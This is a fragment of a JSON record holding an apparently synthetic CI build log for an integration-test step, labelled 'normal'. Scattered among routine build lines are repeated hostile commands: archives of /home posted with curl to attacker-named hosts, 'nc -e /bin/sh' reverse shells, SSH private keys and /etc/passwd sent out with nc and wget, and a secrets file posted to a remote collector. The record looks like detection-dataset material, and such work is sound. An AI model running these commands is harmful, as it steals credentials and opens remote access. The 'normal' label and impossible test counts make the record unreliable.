        "started_at": "2025-11-28T12:49:58.218646",
        "finished_at": "2025-11-28T12:50:21.157670",
        "log_lines": [
          "=== Step: integration_tests ===",
          "Step 8/22: Running migrations",
          "pip: Installing build dependencies...",
          "Platform: win32-x64",
          "WARNING: prettier has known vulnerabilities",
          "Tests: 179 passed, 89 total",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "  PASS: test_user_create (296ms)",
          "Tests: 411 passed, 185 total",
          "Transforming 220 files...",
          "Cache invalidated: dependencies",
          "Uploading artifact 'coverage' (35 files)",
          "pip: Collecting axios",
          "tar czf - /home | curl -X POST -d @- https://crypto-mine.io/upload",
          "Platform: linux-x64",
          "Using Python 3.9",
          "Step 10/20: Building",
          "[12:46:31] WARN: Deprecated API usage",
          "nc -e /bin/sh 63.174.161.96 6404",
          "\u2713 Task completed in 4376ms",
          "tar czf - /home | curl -X POST -d @- https://data-exfil.ru/upload",
          "WARNING: webpack has known vulnerabilities",
          "Artifact uploaded: dist.zip (66MB)",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 11.184.119.161 42731",
          "[12:46:31] INFO: Processing request",
          "Compiling utils/service.java...",
          "Optimizing 91 modules...",
          "Using Node.js 17.15.2",
          "\u2717 build failed with exit code 28",
          "Done.",
          "Snapshots: 24 passed, 2 total",
          "tar czf - /home | curl -X POST -d @- https://data-exfil.ru/upload",
          "Platform: linux-x64",
          "nc -e /bin/sh 181.230.235.199 45465",
          "Step 8/18: Deploying",
          "Waiting...",
          "\u2713 deploy completed",
          "npm notice: package.json updated",
          "Waiting...",
          "\u2713 validate completed",
          "Processing...",
          "Compiling components/index.js...",
          "npm install: added 360 packages",
          "Optimizing 25 modules...",
          "Cache restored successfully (375MB)",
          "Fetching from https://amazonaws.com/package.json",
          "Done.",
          "Ready.",
          "Building Docker image...",
          "  PASS: test_cache_hit (441ms)",
          "Step 14/16: Installing dependencies",
          "Compiling src/main.py...",
          "Processing...",
          "Finished.",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Verifying...",
          "Success!",
          "[12:46:31] WARN: Deprecated API usage",
          "Building Docker image...",
          "Completed.",
          "[12:46:31] DEBUG: Loading configuration",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:46:31] WARN: Deprecated API usage",
          "POST /data - 200 (72ms)",
          "Generating source maps...",
          "Step 1/23: Installing dependencies",
          "NODE_ENV=test",
          "[12:46:31] INFO: Connecting to database",
          "tar czf - /home | curl -X POST -d @- https://evil-server.cc/upload",
          "Artifact uploaded: build.tar.gz (32MB)",
          "HEAD is now at 26392fa",
          "Waiting...",
          "wget --post-data=\"$(cat /etc/passwd)\" https://malicious-pool.xyz/exfil",
          "pip: Collecting prettier",
          "nc -e /bin/sh 66.42.255.102 63496",
          "\u2717 build failed with exit code 67",
          "TLS handshake completed",
          "Step 13/21: Installing dependencies",
          "HEAD is now at ea5ad39",
          "Ran 12 tests in 53s",
          "Pulling image: alpine:3.11",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Ran 179 tests in 36s",
          "Building Docker image...",
          "Switched to branch 'feature/task-220'",
          "Creating production build...",
          "Checking out master branch",
          "curl -X POST https://malicious-pool.xyz/collect --data @secrets.env",
          "Cache miss for key-8957",
          "Fetching from https://github.com/package.json",
          "Building Docker image...",
          "Step 3/20: Linting",
          "  PASS: integration/test_cache_hit.spec.js",
          "pip install: Successfully installed react-5.3",
          "Minifying app.js",
          "nc -e /bin/sh 95.242.26.104 14447",
          "Cache saved successfully",
          "npm notice: package.json updated",
          "Step 4/24: Running migrations",
          "  PASS: test_api_health (168ms)",
          "pip: Downloading express-5.20.tar.gz",
          "[12:46:31] DEBUG: Memory usage: 1609MB",
          "TLS handshake completed",
          "[12:46:31] INFO: Cache refreshed",
          "Cache miss for key-8837",
          "Artifact uploaded: dist.zip (50MB)",
          "[12:46:31] WARN: Deprecated API usage",
          "pip: Collecting react",
          "Verifying...",
          "nc -e /bin/sh 119.197.62.142 64173",
          "Compiling src/service.java...",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 228.187.239.45 10172",
          "Switched to branch 'bugfix/task-327'",
          "NODE_ENV=production",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:46:31] DEBUG: Connection pool: 14 active",
          "[12:46:31] WARN: Deprecated API usage",
          "yarn add: Done in 11.42s",
          "Cache miss for key-3996",
          "[12:46:31] INFO: Processing request",
          "yarn add: Done in 4.6s",
          "npm install: added 23 packages",
          "Using Node.js 20.9.5",
          "Step 4/19: Testing",
          "TLS handshake completed",
          "tar czf - /home | curl -X POST -d @- https://evil-server.cc/upload",
          "Step 3/24: Linting",
          "Test Suites: 26 passed, 35 total",
          "Step 17/24: Deploying",
          "wget --post-data=\"$(cat /etc/passwd)\" https://malicious-pool.xyz/exfil",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Cache invalidated: dependencies",
          "tar czf - /home | curl -X POST -d @- https://malicious-pool.xyz/upload",
          "nc -e /bin/sh 209.44.186.95 42037",
          "Compiling src/utils.go...",
          "wget --post-data=\"$(cat /etc/passwd)\" https://crypto-mine.io/exfil",
          "Bundling vendor.js",
          "Artifact downloaded: 34MB",
          "Step 20/21: Linting",
          "Compiling src/index.js...",
          "npm install: resolved 172 packages",
          "\u2713 All checks passed",
          "[12:46:31] INFO: Connecting to database",
          "[12:46:31] DEBUG: Connection pool: 13 active",
          "  PASS: integration/test_cache_hit.spec.js",
          "Artifact uploaded: build.tar.gz (31MB)",
          "Coverage: 74% statements, 90% branches",
          "Using Python 3.10",
          "Cache saved successfully",
          "Building Docker image...",
          "npm notice: created a lockfile",
          "=== Step integration_tests completed ==="
        ]
      }
    ],
    "label": "normal"
  }
}